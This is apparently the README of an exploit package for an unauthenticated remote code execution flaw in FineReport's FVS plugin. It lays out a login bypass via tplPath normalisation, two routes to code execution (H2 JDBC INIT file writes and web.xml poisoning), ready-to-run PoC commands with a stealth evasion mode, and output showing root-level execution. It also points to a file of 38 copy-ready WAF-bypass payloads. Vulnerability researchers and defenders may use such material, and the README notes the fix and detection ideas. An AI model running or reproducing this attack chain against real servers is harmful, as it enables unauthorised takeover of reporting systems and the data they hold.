# 帆软 FineReport FVS 插件未授权 RCE（fr-fvs-unauth-rce）

- **影响**：FineReport < 11.5.16（FVS/Duchamp 复用资源链路；实验基线 11.5.15 + wysiwyg 插件 4.13.0）
- **修复**：升级 FineReport 至 11.5.16（插件 4.15.0 加鉴权卫兵，同载荷对照已证失效）
- **定性**：未认证远程代码执行，命令以应用进程权限运行（实验容器内 uid=0）
- **情报**：某厂商安全团队 2026-11 公开通告"三重缺陷叠加"；无公开 PoC，本包为独立复现

## 一个鉴权缺陷，两个 RCE 出口

```
?tplPath=reportlets 归一化为空 → 绕过登录校验（未授权调用上传/apply）
├── 路线一 poc-h2.py     props.name 注入 jdbc:h2 URL 的 INIT
│                        → CALL FILE_WRITE 任意路径任意后缀写
│                        → JSP 写入默认 context（ROOT）→ GET 即执行
└── 路线二 poc-attach.py  包内附件清单写 WEB-INF
                         → web.xml 投毒（jsp-file 指向 WEB-INF/x.env）
                         → 容器重载后 GET /webroot/xs?c=<命令> 执行
```

## 文件

| 文件 | 内容 |
|---|---|
| `poc-h2.py` | 路线一 PoC（纯 Python3 标准库零依赖）：上传→apply→触发→回读，内置 5 种实测形态（含 `--shape stealth` 全隐身） |
| `poc-attach.py` | 路线二 PoC：附件层 web.xml 投毒，自动等待重载生效并触发回读 |
| `vulnerability-analysis.md` | 双路线原理分析：鉴权缺陷 + 两个出口的反编译实证 + 判决实验 + 修复面 |
| `waf-variants.md` | 38 个规避变体全集，**每个含可直接复制的完整载荷原文**与有效/死因，附检测侧逐条封堵建议 |

## 快速开始（仅限授权靶场）

```bash
# 路线一（H2）：默认命令 = 落地 id/hostname/date 标记并回读
python3 poc-h2.py -t http://<靶场>:18081
python3 poc-h2.py -t http://<靶场>:18081 -c "id"
python3 poc-h2.py -t http://<靶场>:18081 --shape stealth   # 全隐身形态（\u全转义+CHAR拼后缀+编码路由+body参数+绝对URI）

# 路线二（附件层）：写 WEB-INF/web.xml + WEB-INF/x.env，等重载后经 /xs 触发
python3 poc-attach.py -t http://<靶场>:18081
python3 poc-attach.py -t http://<靶场>:18081 -c "id" --wait 300
```

实测输出（两路线同款收尾，2026-11-22 自建靶场）：

```
[4] trigger -> 200  waitFor=0
[5] readback-> 200
PWN-...-RCE
uid=0(root) gid=0(root) groups=0(root)
<容器hostname>
2026年 11月 22 日 ...
```

## 说明

- 路线一默认写 `/usr/local/tomcat/webapps/ROOT`（官方 Docker 布局的默认 context；
  写 webroot 会被 security.enhance 插件的 JSP-Monitor 秒级改名 .blocked）；
  非 Docker 部署用 `--write-dir` 调整
- 路线二写的是 WEB-INF 内文件（后缀白名单内），投毒 web.xml 在重载后生效——
  自动 reloadable 环境（通告方环境）即刻武器化，其余部署随重启/发版引爆；
  还原 = 删除 `WEB-INF/web.xml` 与 `WEB-INF/x.env` 后重启
- 两路线前置条件相同：目标装有 FVS 插件（H2 为插件自带、触发开关在攻击者包内，零服务端配置）
- 实验环境：FR 11.5.15 引擎容器（宿主 18081→8080）；11.5.16 修复对照镜像已归档验证

## 免责

仅用于授权安全测试、自有靶场复现与防御研究，禁止对生产环境或他人资产使用。
本漏洞已由厂商修复并公开通告；全部实验在自建靶场完成，不含真实目标信息或凭据。
